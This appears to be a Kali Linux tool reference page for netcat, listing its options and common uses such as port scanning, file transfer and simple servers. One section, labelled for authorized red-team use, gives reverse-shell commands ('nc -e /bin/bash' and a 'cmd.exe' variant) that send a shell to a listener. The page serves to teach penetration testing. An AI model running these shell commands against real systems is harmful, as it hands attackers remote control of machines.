![netcat.png](https://github.com/aw-junaid/Kali-Linux/blob/main/Kali%20Linux%20Tools/Images/netcat.png)

Netcat (often abbreviated as `nc`) is a versatile command-line utility for reading and writing data across network connections using TCP or UDP. It's often called the "Swiss Army knife" of networking because of its wide range of uses.

**What `netcat` Does:**

`netcat` can be used for various networking tasks, including:

* **Port Scanning:** Checking if ports are open on a target host.
* **Port Listening:** Listening on a specific port for incoming connections.
* **Data Transfer:** Sending and receiving data between two hosts.
* **Network Chat:** Creating a simple chat server.
* **Proxying:** Acting as a simple network proxy.
* **Banner Grabbing:** Retrieving banners from network services.
* **File Transfer:** Transferring files between hosts.
* **Reverse Shells:** Establishing a reverse shell connection to a target host (for penetration testing, but use responsibly and ethically).

**How to Use `netcat`:**

**Basic Usage:**

* **Connecting to somewhere (Client):**
  ```bash
  nc [-options] hostname port[s] [ports] ...
  ```
  * `nc`: The netcat command.
  * `[-options]`: Flags and parameters to customize the connection.
  * `hostname`: The target hostname or IP address.
  * `port[s] [ports] ...`: The port number(s) to connect to (can be a single port or a range of ports).

* **Listening for inbound (Server):**
  ```bash
  nc -l -p port [-options] [hostname] [port]
  ```
  * `nc`: The netcat command.
  * `-l`: Listen mode (for incoming connections).
  * `-p port`: The port number to listen on.
  * `[-options]`: Flags and parameters.
  * `[hostname]`: (Optional) The hostname to bind to.
  * `[port]`: (Optional) Another port number

**Options:**

* `-c shell commands`: Executes shell commands after a connection is established.  **Dangerous!**  Avoid using this unless you absolutely know what you're doing, as it can create security vulnerabilities.  It's similar to `-e` but uses `/bin/sh`.
* `-e filename`: Executes a program after a connection is established. **Dangerous!**  Similar to `-c`, this can be a major security risk if used improperly.
* `-b`: Allows broadcasts.
* `-g gateway`: Source-routing hop points (up to 8).
* `-G num`: Source-routing pointer (4, 8, 12, ...).
* `-h`: Displays this help message.
* `-i secs`: Delay interval for lines sent and port scans.
* `-k`: Sets the keepalive option on the socket (keeps the connection alive).
* `-l`: Listen mode (for inbound connections).
* `-n`: Numeric-only IP addresses (no DNS lookups).
* `-o file`: Hex dump of traffic to a file.
* `-p port`: Local port number.
* `-r`: Randomize local and remote ports.
* `-q secs`: Quit after EOF on stdin and a delay of `secs`.
* `-s addr`: Local source address.
* `-T tos`: Set Type Of Service.
* `-t`: Answer TELNET negotiation.
* `-u`: UDP mode.
* `-v`: Verbose output (use twice for more verbosity).
* `-w secs`: Timeout for connects and final net reads.
* `-C`: Send CRLF as line ending.
* `-z`: Zero-I/O mode (used for scanning; doesn't send any data).

### **Netcat (nc) Advanced Use Cases & Options** 🚀  


## **📌 Common Netcat Use Cases**

### **🔍 1. Port Scanning (Using `-z` and `-v`)**
```bash
nc -zv 192.168.1.1 1-1000
```
🔹 `-z`: Scan mode (does not send data)  
🔹 `-v`: Verbose output  
🔹 `1-1000`: Scan ports **1 to 1000**  

---

### **🖥️ 2. Start a Netcat Listener (Backdoor or Chat Server)**
```bash
nc -l -p 4444 -v
```
🔹 `-l`: Listen mode  
🔹 `-p 4444`: Listen on **port 4444**  
🔹 `-v`: Verbose mode  

#### **Connect to the Listener**
```bash
nc 192.168.1.10 4444
```

---

### **📂 3. File Transfer (Send & Receive)**
#### **Send a File**
```bash
nc -w 3 192.168.1.10 4444 < file.txt
```
🔹 `-w 3`: **Timeout** after 3 seconds  
🔹 Redirects `file.txt` to the target  

#### **Receive the File**
```bash
nc -l -p 4444 > received.txt
```

---

### **💻 4. Reverse Shell (Hacking / Red Team)**
⚠️ **For legal and authorized security testing only!**  

#### **On the Attacker Machine (Listener)**
```bash
nc -l -p 4444 -v
```

#### **On the Target Machine (Reverse Shell)**
```bash
nc -e /bin/bash 192.168.1.10 4444
```
🔹 `-e /bin/bash`: Opens a **bash shell** on the attacker machine  

💡 **Windows Alternative**
```powershell
nc.exe -e cmd.exe 192.168.1.10 4444
```

---

## **⚙️ Netcat Advanced Features & Options**

### **📡 5. Send Data to a UDP Server**
```bash
echo "Hello UDP" | nc -u 192.168.1.1 9999
```
🔹 `-u`: Use **UDP mode**  

---

### **🔗 6. Create a Simple HTTP Server**
```bash
while true; do nc -l -p 8080 < index.html; done
```
🔹 Serves `index.html` on **port 8080**  

---

### **🌐 7. Send Custom HTTP Requests**
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```
🔹 Sends an **HTTP GET request**  

---

### **🔄 8. Connect to an Open Telnet Server**
```bash
nc -t 192.168.1.1 23
```
🔹 `-t`: Enable **TELNET negotiation**  

---


**Important Considerations:**

* **UDP vs. TCP:** Remember to use the `-u` option if you need to use UDP instead of the default TCP.
* **Port Numbers:** Ports below 1024 often require root privileges.
* **Security:** Be very careful when using `netcat` for tasks like reverse shells.  Make sure you understand the security implications.  Use these techniques only on systems you own or have explicit permission to test.
* **Variations:** There are different implementations of `netcat` (e.g., the original `nc`, `ncat` from Nmap).  The available options might vary slightly.  Check the documentation for the version you are using.

`netcat` is an incredibly useful tool for network tasks.  Its flexibility makes it a valuable asset for network administrators, security professionals, and anyone who works with network connections.  However, like any powerful tool, it should be used responsibly and ethically.  Always prioritize obtaining proper authorization before using `netcat` on any network that you do not own.
